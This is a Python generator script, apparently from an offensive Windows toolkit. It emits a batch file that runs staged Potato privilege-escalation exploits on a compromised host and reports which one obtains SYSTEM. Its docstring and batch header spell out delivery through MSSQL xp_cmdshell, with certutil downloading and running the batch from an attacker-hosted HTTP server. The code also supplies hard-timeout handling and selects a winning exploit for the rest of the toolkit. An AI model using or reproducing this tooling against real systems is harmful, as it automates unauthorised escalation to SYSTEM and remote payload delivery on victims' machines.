#!/usr/bin/env python3
"""Auto-scan every staged Potato on the target — one paste tells you which one works.

Every Potato variant hits a different callback path (RPCSS / EFSRPC / DCOM OXID /
BITS / Spooler), and modern-patched Windows (KB5004442 DCOM hardening etc.) breaks
different ones. Rather than editing TOOL in _winpriv_common.py and re-running
gen_full/nonet/forma between attempts, this generator prints ONE self-contained
batch script that:

  1. auto-detects which Potato exes you've already staged in STAGE (or a --stagedir),
  2. fires each one against a benign `whoami > <marker>` probe (no revshell, no AV
     hit — a pure token-privilege demonstration),
  3. hard-times-out any that hang (SweetPotato on hardened boxes is the poster case)
     via a parallel taskkill,
  4. prints [+] TOOL WORKS or [-] TOOL didn't for each,
  5. summarises the winner(s) at the end.

Set TOOL in _winpriv_common.py to whichever the scan flagged [+], then re-run
gen_full / gen_forma / gen_nonet normally — nothing else about the toolkit changes.

Usage:
    python3 gen_potato_scan.py                    # scan every Potato + emit .bat to stdout
    python3 gen_potato_scan.py > pscan.bat        # save; serve; fetch on target; run
    python3 gen_potato_scan.py TOOL1 TOOL2 ...    # only these
    python3 gen_potato_scan.py --stagedir "D:\\stage"     # non-default staging dir
    python3 gen_potato_scan.py --include-rogue            # also try RoguePotato (needs
                                                          #   socat 135->target:9999 on your box)
    python3 gen_potato_scan.py --timeout 8                # per-tool hard-timeout seconds (default 6)

Delivery on target (via mssqlclient / xp_cmdshell):
    -- serve pscan.bat from your attacker (python3 -m http.server 80)
    EXEC master..xp_cmdshell 'certutil -urlcache -f http://<LHOST>/pscan.bat C:\\Windows\\Temp\\pscan.bat';
    EXEC master..xp_cmdshell 'C:\\Windows\\Temp\\pscan.bat';
"""
import sys
import _winpriv_common as P

_a = sys.argv[1:]

def _opt(name, default=None, is_flag=False):
    if is_flag:
        return name in _a
    if name in _a:
        i = _a.index(name)
        return _a[i + 1] if i + 1 < len(_a) else default
    return default

STAGE = (_opt("--stagedir") or P.STAGE).rstrip("\\")
INCLUDE_ROGUE = _opt("--include-rogue", is_flag=True)
try:
    TIMEOUT = int(_opt("--timeout") or 6)
except (TypeError, ValueError):
    TIMEOUT = 6

# positional args = specific tools to probe; empty = all in POTATOES_CMDLINE
_pos = []
_skip_next = False
for i, a in enumerate(_a):
    if _skip_next:
        _skip_next = False
        continue
    if a in ("--stagedir", "--timeout"):
        _skip_next = True
        continue
    if a.startswith("--"):
        continue
    _pos.append(a)

TOOLS = _pos or list(P.POTATOES_CMDLINE)
# RoguePotato needs -r <LHOST> and an attacker-side socat OXID redirector on port 135;
# skip by default (would just print "failed" for the wrong reason on every scan).
if not INCLUDE_ROGUE:
    TOOLS = [t for t in TOOLS if t != "RoguePotato.exe"]

# --- emit the batch ---------------------------------------------------------------

def _short(tool):
    """Compact per-tool tag for the marker filename + batch goto label. Keeps
    version digits so the three GodPotato-NET{2,35,4} builds don't collide."""
    return tool.replace(".exe", "").replace("-", "").lower()

def _invoke(tool):
    """The exact command line to run this Potato with a benign whoami probe. Uses
    the same POTATOES_CMDLINE argument templates the real generators use, so a WIN
    here means gen_full/gen_forma/gen_nonet will work with the same TOOL."""
    marker = f"{STAGE}\\pscan_{_short(tool)}.txt"
    tmpl = P.POTATOES_CMDLINE.get(tool, "")
    probe = f"cmd.exe /c whoami>{marker}"
    return tmpl.replace("{CMD}", probe).replace("{LHOST}", P.LHOST), marker

lines = [
    "@echo off",
    "setlocal enabledelayedexpansion",
    "REM ----- Skoll Potato auto-scan (benign; each tool -> whoami > marker) -----",
    f"set STAGE={STAGE}",
    "echo === Skoll Potato scan ===",
    f'echo staging dir : %STAGE%',
    f"echo per-tool timeout: {TIMEOUT}s (hangs are hard-killed)",
    "echo.",
    "set WINNERS=",
]

for tool in TOOLS:
    if tool not in P.POTATOES_CMDLINE:
        continue
    inv, marker = _invoke(tool)
    tag = _short(tool)
    lines += [
        f'if not exist "%STAGE%\\{tool}" (echo --- {tool} : not staged, skip --- & goto :after_{tag})',
        f"echo --- {tool} ---",
        f'del "{marker}" 2>nul',
        # start /b returns immediately; we then sleep TIMEOUT via ping and taskkill any hang.
        f'start /b "" "%STAGE%\\{tool}" {inv} >nul 2>nul',
        f"ping -n {TIMEOUT + 1} 127.0.0.1 >nul",
        f'taskkill /f /im "{tool}" >nul 2>nul',
        f'if exist "{marker}" (',
        f'  findstr /i "system" "{marker}" >nul && (echo   [+] {tool} WORKS -- SYSTEM confirmed & set WINNERS=!WINNERS! {tool}) || (echo   [-] {tool} ran but no SYSTEM in marker)',
        f") else (",
        f"  echo   [-] {tool} no marker written (spawn failed / hung / access denied)",
        f")",
        f":after_{tag}",
    ]

lines += [
    "echo.",
    "echo === scan complete ===",
    'if "%WINNERS%"=="" (echo   NONE of the staged Potatoes landed SYSTEM here. Consider LocalPotato ^(file-write^) or a non-Potato route ^(SeBackup/BYOVD/service-misconfig^).) else (echo   Winner^(s^):%WINNERS%  ^-- set TOOL to one of these in _winpriv_common.py and re-run gen_full/gen_forma/gen_nonet.)',
    "endlocal",
]

# Header comments the operator sees when reading the file (batch treats REM as a
# no-op, so they don't affect execution).
header = [
    "@REM -----------------------------------------------------------------------",
    "@REM  Skoll Potato auto-scan  -  paste on target, or:",
    "@REM    on attacker: sudo python3 -m http.server 80",
    f"@REM    on target :  EXEC master..xp_cmdshell 'certutil -urlcache -f http://{P.LHOST}/pscan.bat {STAGE}\\pscan.bat';",
    f"@REM                 EXEC master..xp_cmdshell '{STAGE}\\pscan.bat';",
    f"@REM  probed tools: {' '.join(TOOLS)}",
    f"@REM  results land in {STAGE}\\pscan_<tool>.txt (safe to leave; delete with `del {STAGE}\\pscan_*.txt`).",
    "@REM -----------------------------------------------------------------------",
]

print("\r\n".join(header + lines))
